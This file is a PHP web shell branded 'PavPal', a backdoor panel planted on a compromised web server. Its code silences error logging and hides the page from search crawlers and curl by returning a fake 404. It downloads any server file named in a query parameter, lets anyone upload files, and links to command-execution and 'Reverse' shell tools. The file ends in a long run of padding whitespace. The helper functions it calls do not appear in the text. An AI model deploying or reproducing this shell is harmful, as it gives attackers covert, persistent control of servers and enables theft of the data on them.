<?php
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
if (version_compare(PHP_VERSION, '7', '<')) {
    @set_magic_quotes_runtime(0);
}
$SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
$FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
	
    $file = $_GET['file'];
    if(file_exists($file)) {
      header('Content-Description: File Transfer');
      header('Content-Type: application/octet-stream');
      header('Content-Disposition: attachment; filename='.basename($file));
      header('Content-Transfer-Encoding: binary');
      header('Expires: 0');
      header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
      header('Pragma: public');
      header('Content-Length: ' . filesize($file));
      ob_clean();
      flush();
      readfile($file);
      exit;
    }else {
          die('The provided file path is not valid.');
    }
}
if($_POST['upload']){
  if(@copy($_FILES['file']['tmp_name'], path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
		$act = color(1, 2, "Uploaded!")." at <i><b>".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."</b></i>";
	}
	else {
		$act = color(1, 1, "Failed to upload file!");
	}
}
?>

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>PavPal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.99.0/css/materialize.min.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

    <style>
      #content{
        margin: 20px;
      }
      textarea{
        overflow-y: scroll;
        height: 300px;
      }
    </style>

  </head>
  <body class="grey lighten-2">
    <ul id="dropdown1" class="dropdown-content">
      <li><a href="#!">Reverse</a></li>
      <li><a href="#!">Port Hoax</a></li>
      <li><a href="#!">Jumping</a></li>
    </ul>
    <nav>
      <div class="nav-wrapper teal darken-3">
        <a href="#" class="brand-logo">PavPal</a>
        <ul id="nav-mobile" class="right hide-on-med-and-down">
          <li><a href="?">Home</a></li>
          <li><a href="?act=cmd&#38;dir=<?php print path(); ?>">Cmd</a></li>
          <li>
            <a class="dropdown-button" href="#!" data-activates="dropdown1">Tools<i class="material-icons right">arrow_drop_down</i></a>
          </li>
        </ul>
      </div>
    </nav>

    <div class="row">
      <div class="col s12">
          <div id="content" class="card white">
            <div class="card-content black-text">
              <span class="card-title"><b>Server Info</b></span>
              <div class="row">
                <div class="col s6">
                  <?php serverinfo1(); ?>
                </div>
                <div class="col s6">
                  <?php serverinfo2(); ?>

                </div>
              </div>

              <div class="row">
                <form class="" action="" method="post" enctype="multipart/form-data">
                  <div class="col s6">
                    <p><b>Upload File:</b></p>
                    <div class="file-field input-field">
                      <div class="btn">
                        <span>File</span>
                        <input type="file" name="file">
                      </div>
                      <div class="file-path-wrapper">
                        <input class="file-path validate" type="text">
                      </div>
                    </div>
                    <?php if($_POST['upload']) echo $act; ?>
                  </div>
                  <div class="col s6">
                    <p><b>Options:</b></p><br>
                    <input type="submit" name="upload" value="Upload" class="waves-effect waves-light btn"> :::
                    <a href="?act=newfile<?php if(isset($_GET['dir'])) print '&#38dir=' . path(); ?>" class="waves-effect waves-light btn">New File</a>
                    <a href="?act=newfolder<?php if(isset($_GET['dir'])) print '&#38dir=' . path(); ?>" class="waves-effect waves-light btn">New Folder</a>
                  </div>
                </form>
            </div><hr>
            <?php content(); ?>
            <hr>
            <p>PavPal</p>
          </div>
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.99.0/js/materialize.min.js"></script>
  </body>
</html>

<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
?>